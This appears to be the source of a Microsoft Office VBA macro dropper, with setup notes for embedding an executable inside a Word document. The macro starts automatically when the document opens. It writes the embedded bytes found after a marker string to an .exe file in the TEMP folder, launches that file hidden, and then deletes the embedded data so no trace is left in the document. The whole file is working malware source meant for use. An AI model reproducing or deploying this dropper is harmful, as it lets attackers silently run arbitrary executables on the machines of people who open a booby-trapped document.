INFO:
 Define "var_index", depending on the filesize of the executable to be embedded, as:
 -----------------------------------------------------------------------------------------------------------------
 Data Typ:      | Byte          | Integer          | Long                    | LongLong
 Embedded size: | (63 Byte's)   | (8.191 Byte's)   | (536.870.911 Byte's)    | (2.305.843.009.213.693.951 Byte's)
 Doc size:      | (255+ Byte's) | (32.767+ Byte's) | (2.147.483.647+ Byte's) | (9.223.372.036.854.775.807+ Byte's)

TODO:
 Assign "var_magic" and ".Text" a string value, this magic value is used to find the starting point of the embedded binary.
 Assign "var_fname" (x2) a string value, this value will be the output filename of the embedded binary.
 Assign "var_fenvi" (x2) a KnownFolderPath value, this value will be the folderpath where the output binary will be written to.

 Assign "var_vbCom.Item("")" the current Module, this value is used to delete the macro after execution. (WiP)


-------- MACRO CODE ----------------------------------------------------------------------------------------------

Sub Auto_Open()
	dr0pp3r
End Sub

Sub dr0pp3r()
	Dim var_index As Integer
	Dim var_appnr As Integer
	Dim var_btemp As Byte
	Dim var_fenvi As String
	Dim var_fhand As Integer
	Dim var_fname As String
	Dim var_gotmagic As Boolean
	Dim var_itemp As Integer
	Dim var_magic as String
	Dim var_parag As Paragraph
	Dim var_stemp As String

	var_magic = "e3eStV"
	var_fname = "00000000.exe"
	var_fenvi = Environ("TEMP")

	ChDrive (var_fenvi)
	ChDir (var_fenvi)
	var_fhand = FreeFile()
	Open var_fname For Binary As var_fhand
	For Each var_parag in ActiveDocument.Paragraphs
		DoEvents
			var_stemp = var_parag.Range.Text
		If (var_gotmagic = True) Then
			var_index = 1
			While (var_index < Len(var_stemp))
				var_btemp = Mid(var_stemp,var_index,4)
				Put #var_fhand, , var_btemp
				var_index = var_index + 4
			Wend
		ElseIf (InStr(1,var_stemp,var_magic) > 0 And Len(var_stemp) > 0) Then
			var_gotmagic = True
		End If
	Next

	Close #var_fhand
	l4unch3r(var_fname)
End Sub

Sub s3lfd3l()
	Dim var_range As Range
	Set var_range = ActiveDocument.Range

	With var_range.Find
		.Text = "e3eStV"
		.Forward = True
		.Wrap = wdFindStop
		.Execute

		var_range.End = ActiveDocument.Content.End
	var_range.Delete
	End With

'	WiP (this will likely never get finished !)
'	Dim var_vbCom As Object
'	Set var_vbCom = Application.VBE.ActiveVBProject.VBComponents
'	var_vbCom.Remove VBComponent:= _
'	var_vbCom.Item("")
End Sub

Sub l4unch3r(var_farg As String)
	Dim var_appnr As Integer
	Dim var_fenvi As String
	var_fenvi = Environ("TEMP")
	ChDrive (var_fenvi)
	ChDir (var_fenvi)
	var_appnr = Shell(var_farg, vbHide)
	s3lfd3l
End Sub

Sub AutoOpen()
	Auto_Open
End Sub

Sub Workbook_Open()
	Auto_Open
End Sub